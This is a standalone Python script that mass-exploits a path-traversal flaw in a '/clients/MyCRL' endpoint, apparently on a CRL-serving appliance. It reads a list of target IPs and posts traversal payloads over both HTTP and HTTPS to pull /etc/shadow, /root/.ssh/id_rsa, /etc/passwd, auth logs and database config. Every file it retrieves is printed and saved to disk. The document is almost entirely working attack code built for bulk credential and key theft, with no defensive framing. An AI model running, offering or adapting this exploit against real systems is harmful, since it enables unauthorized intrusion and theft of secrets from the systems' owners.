import requests  
import argparse  
import concurrent.futures  
from urllib3.exceptions import InsecureRequestWarning  
from colorama import Fore, Style, init  
from requests.exceptions import RequestException, Timeout  
  
init(autoreset=True)  
  
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  
  
def exploit(ip, path, output_file=None):  
    if ip.startswith('http://'):  
        ip = ip.replace('http://', '')  
    elif ip.startswith('https://'):  
        ip = ip.replace('https://', '')  
  
    for protocol in ['http://', 'https://']:  
        target = f'{protocol}{ip}/clients/MyCRL'  
        data = path  
  
        headers = {  
            'Host': f'{ip}',  
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',  
            'Te': 'trailers',  
            'Dnt': '1',  
            'Connection': 'keep-alive',  
            'Content-Length': str(len(data))  
        }  
  
        try:  
            response = requests.post(target, headers=headers, data=data, verify=False, timeout=10)  
  
            if response.status_code == 200:  
                print(f"{Fore.GREEN}Contents of {path} on {protocol}{ip}:")  
                print(f"{Fore.BLUE}{response.text}")  
                if output_file:  
                    with open(output_file, 'a') as f:  
                        f.write(f"Contents of {path} on {protocol}{ip}:\n{response.text}\n")  
        except Timeout:  
            print(f"{Fore.RED}Connection timed out for {path} on {protocol}{ip}")  
        except RequestException as e:  
            print(f"{Fore.RED}Request failed for {path} on {protocol}{ip}: {e}")  
  
def scan_ip(ip, output_file=None):  
    paths = [  
        'aCSHELL/../../../../../../../../../../../etc/passwd',  
        'aCSHELL/../../../../../../../../../../../etc/apache2/apache2.conf',  
        'aCSHELL/../../../../../../../../../../../etc/mysql/my.cnf',  
        'aCSHELL/../../../../../../../../../../../var/log/syslog',  
        'aCSHELL/../../../../../../../../../../../var/log/auth.log',  
        #'aCSHELL/../../../../../../../../../../../var/log/messages',  
        'aCSHELL/../../../../../../../../../../../etc/group',  
        'aCSHELL/../../../../../../../../../../../etc/shadow',  
        'aCSHELL/../../../../../../../../../../../root/.ssh/id_rsa',  
        'aCSHELL/../../../../../../../../../../../etc/hostname',  
        'aCSHELL/../../../../../../../../../../../etc/hosts',  
        'aCSHELL/../../../../../../../../../../../etc/resolv.conf'  
    ]  
    for path in paths:  
        exploit(ip, path, output_file)  
  
def main():  
    parser = argparse.ArgumentParser(description="IP scanner with multithreading")  
    parser.add_argument('-i', '--input', help='File with IPs', required=True)  
    parser.add_argument('-t', '--threads', help='Number of threads', required=False, default=5, type=int)  
    parser.add_argument('-o', '--output', help='Output file', required=False)  
    args = parser.parse_args()  
  
    with open(args.input, 'r') as file:  
        ips = file.read().splitlines()  
  
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:  
        for ip in ips:  
            executor.submit(scan_ip, ip, args.output)  
  
if __name__ == '__main__':  
    main()  
